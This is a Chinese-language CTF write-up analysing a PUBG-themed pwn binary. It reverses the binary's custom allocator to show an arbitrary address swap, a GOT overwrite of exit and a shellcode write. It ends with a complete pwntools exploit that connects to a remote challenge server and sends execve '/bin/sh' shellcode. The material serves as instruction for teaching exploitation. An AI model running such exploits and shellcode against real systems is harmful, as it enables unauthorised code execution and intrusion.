
```
puts("welcome to Playerunknown's Battlegrounds");

puts("First,you need set your username and password");

v0 = (accountInfo *) alloc_mem(0x30);

makeChunk((accountInfo *)&structRole, v0);

puts("input your username");

getInputChar((__int64)structRole->username, 0x10LL);

puts("input your password");

getInputChar((__int64)structRole->password, 0x10LL);

puts("Second,you need create a character and give him a name");

v1 = (accountInfo *)alloc_mem(0x38);

makeChunk((accountInfo *)((char *)structRole + 0x28), v1);

structRole->pRole->Health = 100LL;

structRole->pRole->weight = 100LL;

structRole->pRole->stamina = 100LL;

puts("input your character's name");

getInputChar((__int64)structRole->pRole->name, 0x10LL);

puts("all is ok");

```

可以看出先分配了0x30的空间，然后生成一个`chunk`，之后根据提示接受用户输入，完成账号创建。里面涉及了两个结构体，分别是`accountInfo`和`roleInfo` ，其实后面的游戏里还有一个物品信息的结构体，不过解题没用上，就不写了。

`accountInfo` 与 `roleInfo`结构体分析如下:

```
00000000 accountInfo     struc ; (sizeof=0x30, align=0x8, mappedto_7)

00000000 chunk           dq ?

00000008 username        db 16 dup(?)

00000018 password        db 16 dup(?)

00000028 pRole           dq ?                    ; offset

00000030 accountInfo     ends

00000030

00000000 ; ---------------------------------------------------------------------------

00000000

00000000 roleInfo        struc ; (sizeof=0x38, mappedto_8)

00000000 name            db 16 dup(?)

00000010 Health          dq ?

00000018 stamina         dq ?

00000020 weight          dq ?

00000028 place           dq ?

00000030 pItemInfo       dq ?                    ; offset

00000038 roleInfo        ends

```

有了这些信息，再来详细看下`makeChunk`这个函数。

```
_QWORD *__fastcall makeChunk(accountInfo *a1, accountInfo *a2)

{

  _QWORD *v2; // rax

  _QWORD *v3; // rax

  _QWORD *result; // rax



  if ( a2 )

  {

    v2 = (_QWORD *)getChunkHead((__int64)a2);

    init_chunk(v2);

  }

  if ( a1->chunk )

  {

    v3 = (_QWORD *)getChunkHead(a1->chunk);

    free_chunk(v3);

  }

  result = &a1->chunk;

  a1->chunk = (__int64)a2;

  return result;

}
```

```
unsigned __int64 __fastcall free_chunk(_QWORD *a1)

{

  __int64 v1; // rax

  __int64 v3; // [rsp+10h] [rbp-20h]

  _QWORD *v4; // [rsp+18h] [rbp-18h]

  __int64 *v5; // [rsp+20h] [rbp-10h]

  unsigned __int64 v6; // [rsp+28h] [rbp-8h]



  v6 = __readfsqword(0x28u);

  v3 = 0LL;

  v4 = a1;

  --*a1;

  if ( !*v4 )

  {

    while ( 1 )

    {

      v5 = (__int64 *)checkIsAddr((__int64)a1, &v3);

      if ( v5 == 0LL )

        break;

      ++v3;

      v1 = getChunkHead(*v5);

      exchangeAddr(v1);

    }

    exchangeAddr((__int64)v4);

  }

  return __readfsqword(0x28u) ^ v6;

}
```

```
__int64 __fastcall exchangeAddr(__int64 a1)

{

  __int64 result; // rax



  if ( !newChunk )

    newChunk = (__int64)alloc_mem(4);

  *(_QWORD *)(a1 + 0x10) = newChunk;

  *(_QWORD *)newChunk = a1;

  result = newChunk + 8;

  newChunk += 8LL;

  return result;

}
```

- `getChunkHead`就是从数据区-0x10，拿到`chunk头`
- `init_chunk`就是将`chunk头`中最开始的地方+1

这两个点没看出来利用的地方，但是在`else`条件里的`free_chunk`函数，就有点搞头了。

`free_chunk`中，会先对`chunk头`最开始的地方-1,当为0时，从数据区每次读8字节长度作为地址，并判断是否大于0x400000小于0x7FFFFFFFEFFF，如果满足这个条件，就把全局变量`newChunk`的值写入这个地址，在将这个地址写入`newChunk`中，最后`newChunk`加8。

可能看到这里还没明白为什么这是个利用点，我们回到注册函数处再来看下。

`structRole`这个全局指针是一个`chunk`，它的数据区保存的有`账号`和`密码`，而这两个数据是我们可以输入的，所以当发生`exchangeAddr`时，我们可以控制将哪里的地址与`newChunk`交换，当然也包括`got表`。

有了这个点，我们就可以修改`got表`中导入函数指向的地址，这样当被修改的函数调用时，就会到我们可控的地址中执行，但是现在还差点东西，我们还没有可以写入数据或`shellcode`的能力，改`got表`指针也没有意义，不过不要着急，还有一个`cheat`函数没有看。

下面来看`cheat`的实现:

```
void cheat()

{

  if ( cheatMem )

  {

    puts("content:");

    getInputChar(cheatMem + 0x10, 0x12CLL);

  }

  else

  {

    cheatMem = (__int64)alloc_mem(0x30);

    puts("name:");

    getInputChar(cheatMem, 0x10LL);

    puts("content:");

    getInputChar(cheatMem + 0x10, 0x20LL);

  }

}
```

这里判断当全局变量`cheatMem`不为空时，可以写入内容，而且长度为`0x12C`，对比它的`else`条件写入的长度，这里明显就是专门提供我们写入`shellcode`的。只需要用前面的`exchangeAddr`先给`cheatMem`交换来一个地址，就可以写这个地址从+0x10开始长度0x12C的数据了。

现在我们可以修改`got表`，也可以写入`shellcode`，那么选择修改哪个函数呢？ 由于在`shellcode`布置好之前不能调用被修改的函数，找来找去好像只有`exit`可以用，`exit`在程序里可以被触发到的地方只有`getPlace`，下面是`getPlace`函数:

```
int __cdecl getPlace()

{

  int result; // eax



  switch ( structRole->pRole->place )

  {

    case 0LL:

      result = puts("Your in a random location");

      break;

    case 1LL:

      result = puts("Your in the Sosnovka military base");

      break;

    case 2LL:

      result = puts("Your in the Sosnovka military base");

      break;

    case 3LL:

      result = puts("Your in the Georgopol");

      break;

    case 4LL:

      result = puts("Your in the Novorepnoye");

      break;

    case 5LL:

      result = puts("Your in the Mylta Power");

      break;

    case 6LL:

      result = puts("Your in the Primorsk");

      break;

    default:

      puts("location error");

      exit(0);

      return result;

  }

  return result;

}
```

这里通过获取`structRole`中`pRole`结构体的`place`成员(`place`是`pRole`指针偏移`0x28`处)来判断选择的地点，而这个指针是个全局的，就在`cheatMem`旁边，在利用时可以通过`cheatMem`来修改这`pRole`指向的地址，让它指到一个偏移`0x28`处且肯定不是`0~6`的地方就能执行`default`流程触发`exit`。

## 0x02 总结分析结果

至此，利用的点与大致的方案就可以定下来了，总结一下:

1. 首先，要通过`exchangeAddr`来给`cheatMem`赋值，让它可以写内存数据。
2. 然后继续通过`exchangeAddr`来修改`got表`中`exit`函数的地址，以便执行`shellcode`。
3. 由于需要通过`cheatMem`来写`got表`里被修改了的地址内容，又因为`newChunk`是每次+8的，而`cheatMem`只能从+0x10处开始写数据，所以我们要多调用一次`exchangeAddr`，使得被修改的`got表`的函数可以排在`cheatMem + 0x10`之后的位置。
4. 为了使`exit`函数可以触发`shellcode`，需要修改当前`structRole`的`pRole`指针，指向一个+0x28不为`0~6`的地方。

## 0x03 完整利用代码

```
from pwn import *



context.arch = 'amd64'

#p = process('./pwn')

p = remote('123.206.22.95', 8888)

#context.log_level = 'debug'



if __name__ == '__main__':



    #exchange cheatMem

    p.recvuntil('Signup')

    p.recvuntil('==============================')

    p.sendline('2')

    p.recvuntil('username')

    p.sendline(p64(0x6050f0))

    p.recvuntil('password')

    p.sendline(p64(0x6050f0))

    p.recvuntil('name')

    p.sendline('1')

    p.recvuntil('ok')



    #exchange exit

    p.sendline('2')

    p.recvuntil('username')

    p.sendline(p64(0x6050f0))

    p.recvuntil('password')

    p.sendline(p64(0x605080) + p64(0x605080))

    #p.recvuntil('name')

    #p.sendline('1')

    p.recvuntil('==============================')

    p.recvuntil('==============================')



    p.sendline('2')

    p.recvuntil('username')

    p.sendline('3')

    p.recvuntil('password')

    p.sendline('3')

    p.recvuntil('name')

    p.sendline('3')

    p.recvuntil('ok')



    #login

    p.sendline('1')

    p.recvuntil('username')

    p.sendline('3')

    p.recvuntil('password')

    p.sendline('3')

    p.recvuntil('exit')



    #select map

    p.sendline('3')

    p.recvuntil('Primorsk')

    p.sendline('3')

    p.recvuntil('exit')



    #write shellcode and modify place

    #815K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4y4Z5k6h3I4D9i4K6u0V1M7%4c8G2M7X3#2Q4x3X3g2G2M7X3N6Q4x3V1k6K6K9r3g2D9L8r3y4G2k6r3g2Q4x3V1k6X3K9h3I4W2M7#2)9J5c8Y4y4Z5k6h3I4D9j5$3!0V1k6g2)9J5k6o6R3H3y4W2)9J5k6i4m8Z5M7l9`.`.

    #\x31\xc0\x48\xbb

    #\xd1\x9d\x96\x91

    #\xd0\x8c\x97\xff

    #\x48\xf7\xdb\x53

    #\x54\x5f\x99\x52

    #\x57\x54\x5e\xb0

    #\x3b\x0f\x05

    shellcode = p32(0xbb48c031) + p32(0x91969dd1) \

    + p32(0xff978cd0) + p32(0x53dbf748) + p32(0x52995f54) \

    + p32(0xb05e5457) + p32(0x00050f3b) + p32(0) \

    + p64(12) + '\0' * 80 + p64(0x6050B0)

    p.sendline('5')

    p.recvuntil('content:')

    p.sendline(shellcode)

    p.interactive()

```

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
